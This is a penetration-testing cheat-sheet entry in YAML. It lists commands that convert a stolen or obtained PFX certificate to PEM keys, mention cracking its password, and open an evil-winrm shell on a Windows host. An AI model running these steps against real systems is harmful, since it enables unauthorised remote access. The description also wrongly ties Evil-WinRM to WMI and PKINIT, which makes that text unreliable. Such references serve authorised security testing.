---
description: |
  Evil-WinRM uses the Windows Management Instrumentation (WMI) to give you an interactive shell on the Windows host. Winrm Supports PKINIT, meaning if you have a computers PFX file, you can authenticate and get a shell.

  Command Reference:

  	Target IP: 10.10.10.1

    PFX File: cert.pfx

    Domain: EVILCORP

command: |
  First Convert PFX to pem format
  openssl pkcs12 -in cert.pfx -out cert.pem
  Password protected pfx files can be cracked with JohnTheRipper
  Then extract private and public keys from the cert.pem file to two separate files (priv.pem and pub.pem)
  Authenticate to winrm
  evil-winrm -i 10.10.10.1 -c pub.pem -k priv.pem -S -r EVILCORP
items:
  - PFX
services:
  - WMI
OS:
  - Windows
attack_types:
  - Exploitation
references:
  - https://github.com/Hackplayers/evil-winrm
  - https://book.hacktricks.xyz/cryptography/certificates
---
